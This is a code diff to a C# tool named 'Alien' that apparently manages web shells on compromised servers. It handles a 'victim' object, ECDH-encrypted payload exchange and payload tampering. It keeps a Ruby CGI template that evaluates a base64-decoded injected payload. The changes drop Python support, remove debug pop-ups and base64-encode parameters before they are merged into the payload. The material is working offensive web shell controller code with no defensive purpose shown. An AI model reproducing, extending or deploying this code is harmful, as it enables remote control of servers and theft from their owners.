@@ -52,7 +52,7 @@ namespace Alien
             { enLanguage.JSP, "jsp" },
             { enLanguage.JSPX, "jspx" },
             { enLanguage.Perl, "pl" },
-            { enLanguage.Python, "py" },
+            //{ enLanguage.Python, "py" },
             { enLanguage.Ruby, "rb" },
             { enLanguage.CFM, "cfm" }
         };
@@ -67,7 +67,7 @@ namespace Alien
             { enLanguage.JSP, "jsp" },
             { enLanguage.JSPX, "jsp" },
             { enLanguage.Perl, "pl" },
-            { enLanguage.Python, "py" },
+            //{ enLanguage.Python, "py" },
             { enLanguage.Ruby, "rb" },
             { enLanguage.CFM, "cfm" }
         };
@@ -259,15 +259,6 @@ namespace Alien
                 {
                     if (type == "CGI")
                         return @"print ""Content-Type: text/plain\r\n\r\n"";require 'base64';eval(Base64.decode64(""[PATTERN]""));";
-
-                    return null;
-                }
-            },
-            {
-                enLanguage.Python, (type) =>
-                {
-                    if (type == "CGI")
-                        return string.Empty;
 
                     return null;
                 }
@@ -613,8 +604,6 @@ namespace Alien
                         data = szPayloadData
                     };
 
-                    //MessageBox.Show(szPayloadData);
-
                     byte[] plaintext = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(obj, s_jsonOpts));
 
                     byte[] nonce = RandomNumberGenerator.GetBytes(12);
@@ -724,8 +713,6 @@ namespace Alien
                         if (string.IsNullOrEmpty(szResp))
                             throw new Exception("HTTP response is empty.");
 
-                        //MessageBox.Show(szResp);
-
                         byte[] enc = Convert.FromBase64String(szResp);
 
                         byte[] respNonce = enc[..12];
@@ -748,7 +735,6 @@ namespace Alien
                         val = clsEzData.fnszB64d2str(val).Replace("\r\n", string.Empty).Trim('\r').Trim('\n');
                         szSplitter = $"[{szSplitter}]";
                         val = val.Split(szSplitter)[1];
-
                         return val;
                     }
                     catch (Exception ex)
@@ -901,6 +887,11 @@ namespace Alien
 
             if (m_victim.ShellPayloadType == enPayloadType.ECDH)
             {
+                for (int i = 0; i < asParams.Length; i++)
+                {
+                    asParams[i] = clsEzData.fnszStre2b64(asParams[i]);
+                }
+
                 szPayload = clsTamper.fnMergePayloadToOne(m_victim.m_ShellConfig, szPayload, asParams, m_victim.ShellLanguage);
             }
             else
